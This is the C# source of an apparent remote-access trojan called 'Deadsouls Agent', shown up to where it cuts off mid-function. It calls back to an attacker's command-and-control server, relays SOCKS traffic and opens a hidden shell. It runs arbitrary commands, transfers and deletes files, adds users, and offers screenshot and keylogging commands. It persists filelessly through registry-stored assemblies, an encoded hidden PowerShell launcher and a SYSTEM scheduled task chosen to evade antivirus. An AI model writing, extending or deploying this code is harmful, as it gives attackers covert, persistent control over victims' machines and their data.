// =====================================================================
//  DEADSOULS AGENT  (Windows / Linux-ready, Windows active)
//  Pure reverse-tunnel agent - NOT a bot. Connects to the C2 control
//  port, registers SOCKS + bind-shell, serves dynamic CONNECTs, and
//  answers agent commands (/shell start|stop|status, /info, /persist, /unpersist,
//  /exit). Auto-persists itself on startup (no explicit persist command).
//
//  Usage:  agent.exe <c2Ip> <c2Port> <key> [socksPort] [shellPort] [shellType]
//          or read from agent.cfg next to the exe (one value per line).
//
//  Persistence (Windows): IL-in-registry (bot-style). Stores its own compiled
//  assembly bytes in HKCU/HKLM\Software\DeadsoulsService\Payload + a PS boot
//  script that Assembly.Loads it in RAM, plus COM scheduled task
//  "DeadsoulsSvc" (SYSTEM) / RunOnce fallback. Re-applied every 60s.
//  Loaded fully in memory via ping.ps1 stager - no file dropped at boot.
//
//  Build: csc /nologo /target:exe /optimize /out:agent.bin Agent.cs
// =====================================================================
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace DeadsoulsAgent
{
    public static partial class Agent
    {
        static byte[] _aesKey, _hmacKey;
        static readonly byte[] Salt = new byte[] {
            0x7F,0x3C,0x91,0x5E,0xB2,0x0D,0x64,0xA8,
            0x1E,0x49,0xC0,0x55,0xF7,0x2B,0x86,0x3D };
        const int Iterations = 100000;

        static string _c2Ip;
        static int _c2Port;
        static string _key;
        static int _socksPort;
        static int _shellPort;
        static string _shellType = "ps";
        static string _shellCwd;                 // working dir for new shell sessions (shell-at-folder)

        static TcpListener _shellListener;
        static volatile bool _shellRunning;
        static Thread _shellThread;

#if !LINUX && !MACOS
        static string TaskName = "DeadsoulsSvc";
        static string RunOnceValue = "DeadsoulsUpdate";
        const string PayloadKey = @"Software\DeadsoulsService";
#endif

        // set by /unpersist: the 60s persist timer stops re-applying
        // persistence so removal actually sticks.
        static volatile bool _persistDisabled;

        // Own compiled IL bytes - set by the launcher (ping.ps1) at load time
        // so Persist() can store the assembly in the registry for boot loading.
        internal static byte[] _selfAssemblyBytes;

        [STAThread]
        static int Main(string[] args)
        {
            if (!LoadConfig(args))
            {
                Console.Error.WriteLine("usage: agent.exe <c2Ip> <c2Port> <key> [socksPort] [shellPort] [shellType]");
                return 1;
            }
            return AgentLoop();
        }

        // Entry used by the ping.ps1 in-memory stager / registry boot script:
        // config static fields are set via reflection first, then this boots
        // the agent exactly like Main would. No string[] args to marshal.
        public static void BootInMemory()
        {
            if (string.IsNullOrEmpty(_c2Ip) || _c2Port < 1 || string.IsNullOrEmpty(_key)) return;
            InitPorts();
            AgentLoop();
        }

        static int AgentLoop()
        {
            SetCrypto(_key);
#if !LINUX && !MACOS
            if (IsWindows())
            {
                try
                {
                    var cw = Native.GetConsoleWindow();
                    if (cw != IntPtr.Zero) Native.ShowWindow(cw, 0);
                }
                catch { }
            }
#endif
            // re-apply persistence every 60s (survives task/key/unit deletion)
            // - skipped once /unpersist has run. Platform-specific: Windows
            // registry+tasks (Agent.cs), Linux systemd+cron (Agent.linux.cs),
            // macOS launchd (Agent.osx.cs).
            TryPersist(false);
            var persistTimer = new Timer(delegate { if (!_persistDisabled) { try { TryPersist(false); } catch { } } },
                null, TimeSpan.FromSeconds(60), TimeSpan.FromSeconds(60));

            // reconnect loop
            while (true)
            {
                try { ConnectAndServe(); }
                catch { }
                Thread.Sleep(new Random().Next(4000, 12000));
            }
        }

        // ----------------------------------------------------------------
        // config
        // ----------------------------------------------------------------
        static bool LoadConfig(string[] args)
        {
            if (args.Length >= 3)
            {
                _c2Ip = args[0];
                int.TryParse(args[1], out _c2Port);
                _key = args[2];
                if (args.Length >= 4) int.TryParse(args[3], out _socksPort);
                if (args.Length >= 5) int.TryParse(args[4], out _shellPort);
                if (args.Length >= 6) _shellType = args[5].ToLower();
            }
            else
            {
                string cfg = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "agent.cfg");
                if (!File.Exists(cfg)) return false;
                string[] lines = File.ReadAllLines(cfg);
                if (lines.Length < 3) return false;
                _c2Ip = lines[0].Trim();
                int.TryParse(lines[1].Trim(), out _c2Port);
                _key = lines[2].Trim();
                if (lines.Length >= 4) int.TryParse(lines[3].Trim(), out _socksPort);
                if (lines.Length >= 5) int.TryParse(lines[4].Trim(), out _shellPort);
                if (lines.Length >= 6) _shellType = lines[5].Trim().ToLower();
            }
            if (string.IsNullOrEmpty(_c2Ip) || _c2Port < 1 || string.IsNullOrEmpty(_key)) return false;
            InitPorts();
            return true;
        }

        // well-seeded Random: two agents launched in the same tick must not collide on ports
        static void InitPorts()
        {
            var rng = new Random(Guid.NewGuid().GetHashCode() ^ Environment.TickCount);
            if (_socksPort == 0) _socksPort = rng.Next(20000, 30000);
            if (_shellPort == 0) _shellPort = rng.Next(30000, 40000);
        }

        // ----------------------------------------------------------------
        // control connection
        // ----------------------------------------------------------------
        static void ConnectAndServe()
        {
            using (var ctrl = new TcpClient(_c2Ip, _c2Port))
            {
                ctrl.NoDelay = true;
                var st = ctrl.GetStream();

                string os = GetOs(), arch = GetArch();
                TunnelWriteFrame(st, Encoding.UTF8.GetBytes("HELLO|" + _key + "|" + os + "|" + arch + "|" +
                    Environment.MachineName + "|" + Environment.UserName + "|" + Process.GetCurrentProcess().Id));

                string ok = Encoding.UTF8.GetString(TunnelReadFrame(st));
                if (!ok.StartsWith("OK|")) return;

                EnsureShellRunning();

                TunnelWriteFrame(st, Encoding.UTF8.GetBytes("REG|" + _socksPort + "|" + _shellPort + "|" + _shellType));
                string regOk = Encoding.UTF8.GetString(TunnelReadFrame(st));
                if (regOk != "OK") return;

                while (true)
                {
                    string f = Encoding.UTF8.GetString(TunnelReadFrame(st));
                    if (f.StartsWith("FWD|"))
                    {
                        // FWD|<sid>|<host>|<port>
                        string[] p = f.Split('|');
                        if (p.Length < 4) continue;
                        string sid = p[1], host = p[2];
                        int port; if (!int.TryParse(p[3], out port)) continue;
                        int cport = port;
                        Task.Run(() => HandleForward(sid, host, cport));
                    }
                    else if (f.StartsWith("XFER|"))
                    {
                        // XFER|<sid>|<U|D>|<path>   (file transfer over a data session)
                        string[] p = f.Split('|');
                        if (p.Length < 4) continue;
                        string xsid = p[1], mode = p[2], path = p[3];
                        Task.Run(() => HandleXfer(xsid, mode, path));
                    }
                    else if (f.StartsWith("CMD|"))
                    {
                        // CMD|<rid>|<text>
                        string[] p = f.Split(new char[] { '|' }, 3);
                        if (p.Length < 3) continue;
                        string rid = p[1], text = p[2];
                        string res = HandleAgentCommand(text);
                        TunnelWriteFrame(st, Encoding.UTF8.GetBytes("RESULT|" + rid + "|" + res));
                    }
                }
            }
        }

        // ----------------------------------------------------------------
        // forward (dynamic CONNECT)
        // ----------------------------------------------------------------
        static void HandleForward(string sid, string host, int port)
        {
            try
            {
                using (var data = new TcpClient(_c2Ip, _c2Port))
                {
                    data.NoDelay = true;
                    var ds = data.GetStream();
                    TunnelWriteFrame(ds, Encoding.UTF8.GetBytes("SESSION|" + sid));

                    TcpClient target = null;
                    try { target = new TcpClient(host, port); }
                    catch
                    {
                        try { TunnelWriteFrame(ds, Encoding.UTF8.GetBytes("SESSION_FAIL")); } catch { }
                        return;
                    }
                    using (target)
                    using (var ts = target.GetStream())
                    {
                        TunnelWriteFrame(ds, Encoding.UTF8.GetBytes("SESSION_OK"));
                        var t1 = Task.Run(() => RelayEncryptedToPlain(ds, ts));
                        var t2 = Task.Run(() => RelayPlainToEncrypted(ts, ds));
                        Task.WaitAny(t1, t2);
                    }
                }
            }
            catch { }
        }

        static void RelayEncryptedToPlain(Stream from, Stream to)
        {
            try { while (true) { byte[] p = TunnelReadFrame(from); to.Write(p, 0, p.Length); to.Flush(); } }
            catch { }
        }

        static void RelayPlainToEncrypted(Stream from, Stream to)
        {
            try
            {
                var buf = new byte[8192];
                int n;
                while ((n = from.Read(buf, 0, buf.Length)) > 0)
                {
                    var chunk = new byte[n];
                    Buffer.BlockCopy(buf, 0, chunk, 0, n);
                    TunnelWriteFrame(to, chunk);
                }
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // file transfer (XFER) - raw bytes over a data session
        // Frame layout within the session:
        //   [0x00][data...]                      file bytes
        //   [0x01][text]                         control: DONE|<size>|<sha256> | ACK | ERR|<msg>
        // ----------------------------------------------------------------
        static void HandleXfer(string xsid, string mode, string path)
        {
            try
            {
                using (var data = new TcpClient(_c2Ip, _c2Port))
                {
                    data.NoDelay = true;
                    var ds = data.GetStream();
                    TunnelWriteFrame(ds, Encoding.UTF8.GetBytes("SESSION|" + xsid));
                    TunnelWriteFrame(ds, Encoding.UTF8.GetBytes("SESSION_OK"));

                    if (mode == "U")
                    {
                        // upload: C2 streams file -> we write it to disk
                        using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.Read))
                        {
                            while (true)
                            {
                                byte[] fr = TunnelReadFrame(ds);
                                if (fr[0] == 0x01)
                                {
                                    string s = Encoding.UTF8.GetString(fr, 1, fr.Length - 1);
                                    if (s.StartsWith("DONE|")) break;
                                    TunnelWriteFrame(ds, Ctrl("ERR|bad control: " + s));
                                    return;
                                }
                                fs.Write(fr, 1, fr.Length - 1);
                            }
                        }
                        TunnelWriteFrame(ds, Ctrl("ACK"));
                    }
                    else
                    {
                        // download: we stream the file -> C2
                        using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        using (var sha = SHA256.Create())
                        {
                            byte[] buf = new byte[262144];
                            int n;
                            long total = 0;
                            while ((n = fs.Read(buf, 0, buf.Length)) > 0)
                            {
                                sha.TransformBlock(buf, 0, n, null, 0);
                                var chunk = new byte[n + 1];
                                chunk[0] = 0x00;
                                Buffer.BlockCopy(buf, 0, chunk, 1, n);
                                TunnelWriteFrame(ds, chunk);
                                total += n;
                            }
                            sha.TransformFinalBlock(new byte[0], 0, 0);
                            string hex = ToHex(sha.Hash);
                            TunnelWriteFrame(ds, Ctrl("DONE|" + total + "|" + hex));
                        }
                        try { TunnelReadFrame(ds); } catch { } // ACK / ERR; nothing to do
                    }
                }
            }
            catch { }
        }

        static byte[] Ctrl(string text)
        {
            byte[] t = Encoding.UTF8.GetBytes(text);
            var f = new byte[1 + t.Length];
            f[0] = 0x01;
            Buffer.BlockCopy(t, 0, f, 1, t.Length);
            return f;
        }

        static string ToHex(byte[] b)
        {
            var sb = new StringBuilder(b.Length * 2);
            foreach (byte x in b) sb.Append(x.ToString("x2"));
            return sb.ToString();
        }

        static string Env(Environment.SpecialFolder sf)
        {
            try { string p = Environment.GetFolderPath(sf); return string.IsNullOrEmpty(p) ? "" : p; }
            catch { return ""; }
        }

        // ----------------------------------------------------------------
        // agent commands
        // ----------------------------------------------------------------
        static string HandleAgentCommand(string text)
        {
            string t = text.Trim();
            if (t.Length == 0) return "empty command";

            // pipe-commands carry paths that may contain spaces, so they are
            // parsed with '|' as the separator (Windows paths can't contain '|')
            if (t.Contains("|"))
            {
                int pipe = t.IndexOf('|');
                string pcmd = t.Substring(0, pipe).Trim().ToLower();
                string parg = t.Substring(pipe + 1).Trim();
                switch (pcmd)
                {
                    case "dir": return DirListing(parg);
                    case "rm": return RemovePath(parg);
                    case "ren": return RenamePath(parg);
                    case "cwd": return SetShellCwd(parg);
                    case "exec": return ExecCommand(parg);
                    case "adduser": return AddUser(parg);       // adduser|<user>|<pass>
                    case "removeuser": return RemoveUser(parg);  // removeuser|<user>
                }
                // not a pipe-command: fall through to normal space-split handling
            }

            string[] a = t.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            string cmd = a[0].ToLower();
            try
            {
                switch (cmd)
                {
                    case "/shell":
                    case "shell":
                        if (a.Length >= 2 && (a[1].ToLower() == "stop"))
                        {
                            StopShell();
                            return "shell stopped";
                        }
                        if (a.Length >= 2 && (a[1].ToLower() == "status"))
                            return _shellRunning ? "shell running on :" + _shellPort + " (" + _shellType + ")" : "shell stopped";
                        // /shell start [ps|cmd] [port]
                        if (a.Length >= 2 && a[1].ToLower() != "start") _shellType = a[1].ToLower();
                        if (a.Length >= 3) { int np; if (int.TryParse(a[2], out np) && np > 1024) _shellPort = np; }
                        StopShell();
                        EnsureShellRunning();
                        return "shell started on :" + _shellPort + " (" + _shellType + ")";

                    case "/info":
                    case "info":
                        {
                            var sb = new StringBuilder();
                            sb.AppendLine("os=" + GetOs());
                            sb.AppendLine("arch=" + GetArch());
                            sb.AppendLine("machine=" + Environment.MachineName);
                            sb.AppendLine("domain=" + GetDomain());
                            sb.AppendLine("user=" + Environment.UserName);
                            sb.AppendLine("pid=" + Process.GetCurrentProcess().Id);
                            sb.AppendLine("path=" + ExePath());
                            sb.AppendLine("time=" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                            sb.AppendLine("uptime=" + GetUptime());
                            sb.AppendLine("cpu=" + GetCpuName());
                            sb.AppendLine("cores=" + Environment.ProcessorCount);
                            sb.AppendLine("ram=" + GetRamMB());
                            sb.AppendLine("shell=" + (_shellRunning ? _shellType + ":" + _shellPort : "stopped"));
                            sb.AppendLine("persist=" + (PersistActive() ? "yes" : "no"));
                            string net = GetNetLines();
                            if (net.Length > 0) sb.Append(net);
                            return sb.ToString().TrimEnd('\r', '\n');
                        }

                    case "/persist":
                    case "persist":
                        _persistDisabled = false;
                        return PersistReport();

                    case "/unpersist":
                    case "unpersist":
                        _persistDisabled = true;
                        return RemovePersist() ? "persistence removed (auto re-persist disabled)" : "unpersist: task not found / failed";

                    case "/exit":
                    case "exit":
                        Task.Run(delegate { Thread.Sleep(300); Environment.Exit(0); });
                        return "bye";

                    case "getusers": return ListUsers();
                    case "screenshot": return ScreenshotCapture();
                    case "keylogstart": return KeylogStart();
                    case "keylogstop": return KeylogStop();

                    default:
                        return "unknown agent command: " + cmd + " (shell start|stop|status, persist, unpersist, info, exit, dir, rm, ren, cwd, exec, adduser, removeuser, getusers, screenshot, keylogstart, keylogstop)";
                }
            }
            catch (Exception ex) { return "error: " + ex.Message; }
        }

        // ----------------------------------------------------------------
        // exec: run an arbitrary OS command and return captured output
        // (drives the Helcurt AI loop - C2 relays EXEC|<command> here)
        // ----------------------------------------------------------------
        static string ExecCommand(string cmd)
        {
            try
            {
                string file, prefix;
                ResolveExec(out file, out prefix);
                // cmd.exe does NOT treat backslash as a quote-escape - the old
                // \" mangling made net user / net localgroup receive garbage
                // args and print syntax help. The only reliable way to pass a
                // command that contains embedded quotes through cmd /c is:
                //     cmd /d /s /c " <cmd>"
                // - /s strips the OUTER pair of quotes from the /c string
                // - the leading space inside the quotes stops cmd from
                //   re-parsing the first token as an executable
                // - inner quotes are doubled ("" -> ") so they survive intact
                string args = prefix + "\" " + cmd.Replace("\"", "\"\"") + "\"";
                using (var p = Process.Start(new ProcessStartInfo(file, args)
                {
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }))
                {
                    if (p == null) return "error: could not start process";
                    var sb = new StringBuilder();
                    // read stdout+stderr concurrently so neither pipe blocks
                    var tOut = Task.Run(() => p.StandardOutput.ReadToEnd());
                    var tErr = Task.Run(() => p.StandardError.ReadToEnd());
                    if (!p.WaitForExit(30000))
                    {
                        try { p.Kill(); } catch { }
                        return "error: command timed out after 30s";
                    }
                    string o = tOut.Result, e = tErr.Result;
                    sb.Append(o);
                    if (e.Length > 0) sb.Append(e);
                    sb.Append("\nexit=").Append(p.ExitCode);
                    return sb.ToString();
                }
            }
            catch (Exception ex) { return "error: " + ex.Message; }
        }


        // ----------------------------------------------------------------
        // file-system helpers
        // ----------------------------------------------------------------
        static string DirListing(string path)
        {
            var sb = new StringBuilder();
            try
            {
                if (string.IsNullOrEmpty(path))
                {
                    // special folders
                    string[] names = { "Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos" };
                    string[] paths = {
                        Env(Environment.SpecialFolder.DesktopDirectory),
                        Env(Environment.SpecialFolder.MyDocuments),
                        Path.Combine(Env(Environment.SpecialFolder.UserProfile), "Downloads"),
                        Env(Environment.SpecialFolder.MyPictures),
                        Env(Environment.SpecialFolder.MyMusic),
                        Env(Environment.SpecialFolder.MyVideos) };
                    for (int i = 0; i < names.Length; i++)
                        if (paths[i].Length > 0) sb.AppendLine("SPC|" + names[i] + "|" + paths[i]);
                    // drives
                    foreach (var d in DriveInfo.GetDrives())
                    {
                        try
                        {
                            var di = new DriveInfo(d.Name);
                            sb.AppendLine("DRV|" + d.Name + "|" + (di.IsReady ? di.TotalSize : 0) + "|" + (di.IsReady ? di.AvailableFreeSpace : 0));
                        }
                        catch { }
                    }
                    return sb.ToString().TrimEnd('\r', '\n');
                }

                string full = Path.GetFullPath(path);
                if (!Directory.Exists(full)) return "ERR|not found: " + full;
                sb.AppendLine("PATH|" + full);

                var dirs = new List<string>();
                var files = new List<string>();
                try { dirs.AddRange(Directory.GetDirectories(full)); } catch { }
                try { files.AddRange(Directory.GetFiles(full)); } catch { }
                dirs.Sort(StringComparer.OrdinalIgnoreCase);
                files.Sort(StringComparer.OrdinalIgnoreCase);
                foreach (var d in dirs)
                {
                    try
                    {
                        var di = new DirectoryInfo(d);
                        sb.AppendLine("D|" + di.Name + "|" + di.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
                    }
                    catch { }
                }
                foreach (var f in files)
                {
                    try
                    {
                        var fi = new FileInfo(f);
                        sb.AppendLine("F|" + fi.Name + "|" + fi.Length + "|" + fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
                    }
                    catch { }
                }
                return sb.ToString().TrimEnd('\r', '\n');
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        static string RemovePath(string target)
        {
            try
            {
                if (Directory.Exists(target)) { Directory.Delete(target, true); return "ok"; }
                if (File.Exists(target)) { File.Delete(target); return "ok"; }
                return "ERR|not found: " + target;
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        static string RenamePath(string spec)
        {
            // ren|<src>|<dst>
            string[] p = spec.Split(new char[] { '|' }, 2);
            if (p.Length < 2) return "usage: ren|<src>|<dst>";
            string src = p[0].Trim(), dst = p[1].Trim();
            try
            {
                if (Directory.Exists(src)) { Directory.Move(src, dst); return "ok"; }
                if (File.Exists(src)) { File.Move(src, dst); return "ok"; }
                return "ERR|not found: " + src;
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        static string SetShellCwd(string path)
        {
            try
            {
                string full = Path.GetFullPath(path);
                if (!Directory.Exists(full)) return "ERR|not found: " + full;
                _shellCwd = full;
                return "cwd=" + full;
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        // ----------------------------------------------------------------
        // bind shell (loopback only - reached via SOCKS)
        // ----------------------------------------------------------------
        static void EnsureShellRunning()
        {
            if (_shellRunning) return;
            try
            {
                _shellListener = new TcpListener(IPAddress.Loopback, _shellPort);
                _shellListener.Start();
                _shellRunning = true;
                _shellThread = new Thread(ShellAcceptLoop);
                _shellThread.IsBackground = true;
                _shellThread.Start();
            }
            catch { }
        }

        static void StopShell()
        {
            _shellRunning = false;
            try { if (_shellListener != null) _shellListener.Stop(); } catch { }
        }

        static void ShellAcceptLoop()
        {
            try
            {
                while (_shellRunning)
                {
                    var c = _shellListener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(HandleShellClient, c);
                }
            }
            catch { }
        }

        // sentinel echoed by the shell after every command; when the output
        // pump sees it, it re-prints the prompt. Unique token => no collision
        // with normal command output.
        const string ShellEndMark = "HANZO__7F3A__END";

        static void WriteShellPrompt(StreamWriter writer, bool isCmd)
        {
            writer.Write(PromptPrefix(isCmd));
            writer.Flush();
        }

        static void HandleShellClient(object o)
        {
            var c = (TcpClient)o;
            try
            {
                using (c)
                using (var stream = c.GetStream())
                using (var reader = new StreamReader(stream, Encoding.UTF8))
                using (var writer = new StreamWriter(stream, new UTF8Encoding(false)) { AutoFlush = true })
                using (var proc = new Process())
                {
                    bool isCmd = _shellType == "cmd";
                    writer.WriteLine("Type 'exit' to disconnect.");
                    WriteShellPrompt(writer, isCmd);

                    string shellExe, shellArgs;
                    ResolveShell(out shellExe, out shellArgs);
                    proc.StartInfo.FileName = shellExe;
                    proc.StartInfo.Arguments = shellArgs;
                    proc.StartInfo.RedirectStandardInput = true;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.RedirectStandardError = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;
                    // shell-at-folder: start the process in the directory set
                    // via 'cwd' (set from the explorer UI / C2 console)
                    if (!string.IsNullOrEmpty(_shellCwd) && Directory.Exists(_shellCwd))
                        proc.StartInfo.WorkingDirectory = _shellCwd;
                    proc.Start();

                    // output pump: forward stdout line by line; on the sentinel
                    // line, drop it and print a fresh prompt instead.
                    var stdoutThread = new Thread(delegate ()
                    {
                        try
                        {
                            var sb = new StringBuilder();
                            var buf = new char[8192];
                            int n;
                            while ((n = proc.StandardOutput.Read(buf, 0, buf.Length)) > 0)
                            {
                                sb.Append(buf, 0, n);
                                string s = sb.ToString();
                                sb.Clear();
                                int idx;
                                while ((idx = s.IndexOf('\n')) >= 0)
                                {
                                    string l = s.Substring(0, idx).TrimEnd('\r');
                                    s = s.Substring(idx + 1);
                                    if (l.Trim() == ShellEndMark) WriteShellPrompt(writer, isCmd);
                                    else { writer.Write(l + "\r\n"); writer.Flush(); }
                                }
                                sb.Append(s); // keep unterminated remainder
                            }
                            if (sb.Length > 0 && sb.ToString().Trim() != ShellEndMark)
                            { writer.Write(sb.ToString()); writer.Flush(); }
                        }
                        catch { }
                    });
                    stdoutThread.IsBackground = true;
                    stdoutThread.Start();

                    var stderrThread = new Thread(delegate ()
                    {
                        try
                        {
                            var buf = new char[8192];
                            int n;
                            while ((n = proc.StandardError.Read(buf, 0, buf.Length)) > 0)
                            {
                                writer.Write(buf, 0, n);
                                writer.Flush();
                            }
                        }
                        catch { }
                    });
                    stderrThread.IsBackground = true;
                    stderrThread.Start();

                    try
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            if (line.Trim() == "exit") break;
                            // echo the command so the operator sees input like
                            // a real terminal, then send it + the end marker.
                            writer.Write(line + "\r\n");
                            writer.Flush();
                            proc.StandardInput.WriteLine(line);
                            proc.StandardInput.WriteLine(isCmd ? "echo " + ShellEndMark : "echo " + ShellEndMark);
                            proc.StandardInput.Flush();
                        }
                    }
                    catch { }
                    try { proc.Kill(); } catch { }
                }
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // persistence (Windows)
        // ----------------------------------------------------------------
        static string ExePath()
        {
            try { return System.Reflection.Assembly.GetEntryAssembly().Location; }
            catch { return Process.GetCurrentProcess().MainModule.FileName; }
        }

        static bool IsWindows()
        {
            return Environment.OSVersion.Platform == PlatformID.Win32NT ||
                   Environment.OSVersion.Platform == PlatformID.Win32Windows ||
                   Environment.OSVersion.Platform == PlatformID.Win32S;
        }

#if !LINUX && !MACOS
        static bool IsAdmin()
        {
            try
            {
                var wi = new System.Security.Principal.WindowsIdentity(System.Security.Principal.WindowsIdentity.GetCurrent().Token);
                var wp = new System.Security.Principal.WindowsPrincipal(wi);
                return wp.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        // ---- shell (Windows) ---------------------------------------------------
        static void ResolveShell(out string exe, out string args)
        {
            if (_shellType == "cmd") { exe = "cmd.exe"; args = "/Q"; }
            else { exe = "powershell.exe"; args = "-NoProfile -NoExit -"; }
        }

        static void ResolveExec(out string exe, out string prefix)
        {
            exe = "cmd.exe";
            // /d : skip AutoRun (deterministic, faster)
            // /s : strip outer quotes of the /c string - REQUIRED for correct
            //      handling of commands containing embedded quotes
            prefix = "/d /s /c ";
        }

        static string PromptPrefix(bool isCmd)
        {
            return isCmd ? "C:\\> " : "\x1b[91mHANZO-PS-" + Environment.MachineName + "> \x1b[0m";
        }
#endif

        // ====================================================================
        // PERSISTENCE (bot-style IL-in-registry) - WINDOWS ONLY
        // (Linux/macOS persistence lives in Agent.linux.cs / Agent.osx.cs)
        // 1. own assembly IL bytes -> HKCU/HKLM\Software\DeadsoulsService\Payload
#if !LINUX && !MACOS
        //    (REG_BINARY). Pure IL "injection" into the registry - no file on
        //    disk at boot time.
        // 2. PS boot script (reads Payload from registry, Assembly.Load in RAM,
        //    re-injects _selfAssemblyBytes, invokes Main with our connection
        //    config) stored next to it as 'Script'.
        // 3. Scheduled task "DeadsoulsSvc" (COM API, SYSTEM, boot trigger,
        //    hidden) - RunOnce fallback when not admin.
        // 4. Admin: disable Fast Startup so the task always fires on boot.
        // Called at startup + every 60s (timer). No explicit persist command.
        // ====================================================================
        static bool TryPersist(bool force)
        {
            try
            {
                bool isAdmin = IsAdmin();

                // ── 1. Store the assembly IL in the registry ──
                byte[] self = _selfAssemblyBytes;
                if (self == null) { try { self = File.ReadAllBytes(ExePath()); } catch { } }
                if (self != null)
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(PayloadKey))
                        if (key != null) key.SetValue("Payload", self, Microsoft.Win32.RegistryValueKind.Binary);
                    if (isAdmin)
                    {
                        using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(PayloadKey))
                            if (key != null) key.SetValue("Payload", self, Microsoft.Win32.RegistryValueKind.Binary);
                    }
                }

                // ── 2. Boot script (registry-resident, loads IL in RAM) ──
                string bootHive = isAdmin ? "HKLM" : "HKCU";
                string altHive = isAdmin ? "HKCU" : "HKLM";
                string psBootScript =
                    "$e=$null;" +
                    "try{$e=(gp '" + bootHive + ":\\" + PayloadKey + "' Payload -EA Stop).Payload}catch{};" +
                    "if(-not $e){$e=(gp '" + altHive + ":\\" + PayloadKey + "' Payload -EA Stop).Payload};" +
                    "$a=[Reflection.Assembly]::Load($e);" +
                    "$t=$a.GetType('DeadsoulsAgent.Agent');" +
                    "$t.GetField('_selfAssemblyBytes',56).SetValue($null,$e);" +
                    "$t.GetField('_c2Ip',56).SetValue($null,'" + _c2Ip.Replace("'", "''") + "');" +
                    "$t.GetField('_c2Port',56).SetValue($null,[int]" + _c2Port + ");" +
                    "$t.GetField('_key',56).SetValue($null,'" + _key.Replace("'", "''") + "');" +
                    "$t.GetMethod('BootInMemory',56).Invoke($null,$null)";
                string psB64 = System.Convert.ToBase64String(Encoding.Unicode.GetBytes(psBootScript));
                string launchCmd = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand " + psB64;

                try
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(PayloadKey, true))
                        if (key != null) key.SetValue("Script", psBootScript, Microsoft.Win32.RegistryValueKind.String);
                    if (isAdmin)
                    {
                        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(PayloadKey, true))
                            if (key != null) key.SetValue("Script", psBootScript, Microsoft.Win32.RegistryValueKind.String);
                    }
                }
                catch { }

                // ── 3. Scheduled task (admin) - COM API first ──
                bool bootTaskOk = false;
                if (isAdmin)
                    bootTaskOk = CreateBootTask(TaskName, launchCmd);

                // ── 4. RunOnce fallback (works without admin) ──
                if (!bootTaskOk)
                {
                    try
                    {
                        string runOnceHive = isAdmin ? "HKLM" : "HKCU";
                        string runOnceCmd = "powershell -Ex Bypass -NoP -W H -Com \"$s=(gp '" + runOnceHive +
                            ":\\" + PayloadKey + "' Script -EA Stop).Script;[ScriptBlock]::Create($s).Invoke()\"";
                        using (var key = (isAdmin
                            ? Microsoft.Win32.Registry.LocalMachine
                            : Microsoft.Win32.Registry.CurrentUser)
                            .OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                        {
                            if (key != null)
                                key.SetValue(RunOnceValue, runOnceCmd, Microsoft.Win32.RegistryValueKind.String);
                        }
                    }
                    catch { }
                }

                // ── 5. Disable Fast Startup (admin) - task always fires on boot ──
                if (isAdmin)
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo("powercfg.exe", "/h off")
                        { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                    }
                    catch { }
                }
                return true;
            }
            catch { return false; }
        }

        // Task Scheduler via COM API (avoids AV-flagged schtasks.exe). Falls
        // back to schtasks.exe if COM fails.
        static bool CreateBootTask(string taskName, string commandLine)
        {
            try
            {
                Type t = Type.GetTypeFromProgID("Schedule.Service");
                if (t == null) return false;
                dynamic scheduler = Activator.CreateInstance(t);
                scheduler.Connect();
                dynamic folder = scheduler.GetFolder("\\");
                dynamic task = scheduler.NewTask(0);

                task.Principal.UserId = "SYSTEM";
                task.Principal.LogonType = 5;  // TASK_LOGON_S4U
                task.Principal.RunLevel = 1;   // TASK_RUNLEVEL_HIGHEST

                task.Settings.StartWhenAvailable = true;
                task.Settings.Hidden = true;
                task.Settings.DisallowStartIfOnBatteries = false;
                task.Settings.StopIfGoingOnBatteries = false;
                task.Settings.Enabled = true;
                task.Settings.AllowHardTerminate = true;

                dynamic trigger = task.Triggers.Create(8); // TASK_TRIGGER_BOOT
                trigger.Enabled = true;

                dynamic action = task.Actions.Create(0);   // TASK_ACTION_EXEC
                action.Path = "powershell";
                string args = commandLine;
                if (args.StartsWith("powershell ", StringComparison.OrdinalIgnoreCase))
                    args = args.Substring("powershell ".Length);
                action.Arguments = args;

                folder.RegisterTaskDefinition(taskName, task, 6, null, null, 5);
                return true;
            }
            catch
            {
                try
                {
                    string taskArgs = "/create /tn \"" + taskName + "\" /tr \"" + commandLine + "\" /sc onstart /ru SYSTEM /f";
                    var p = Process.Start(new ProcessStartInfo("schtasks.exe", taskArgs)
                    { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
